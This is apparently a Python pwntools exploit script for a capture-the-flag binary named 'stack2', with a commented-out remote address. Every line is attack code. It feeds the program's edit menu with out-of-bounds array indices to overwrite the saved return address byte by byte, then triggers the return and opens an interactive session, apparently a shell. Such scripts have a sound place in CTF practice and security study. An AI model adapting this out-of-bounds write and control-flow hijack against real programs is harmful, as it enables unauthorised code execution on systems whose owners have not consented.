from pwn import *
context.log_level = 'debug'
sh=process('./stack2')
#sh=remote('111.198.29.45','32440')
sh.recvuntil('have:\n')
sh.sendline(str(2))

sh.recvuntil('numbers')
sh.sendline('11\n22')

sh.recv()
addr = 0x804869b
def edit(idx,num):
	sh.recv()
	sh.sendline('3')
	sh.recvuntil('change:\n')
	sh.sendline(str(idx))
	sh.sendlineafter('number:\n',str(num))

edit(135,0xaf)
edit(136,0x85)
edit(137,4)
edit(138,8)
#gdb.attach(sh,"b *0x8048747")
sh.recv()
sh.sendline('5')
sh.interactive()
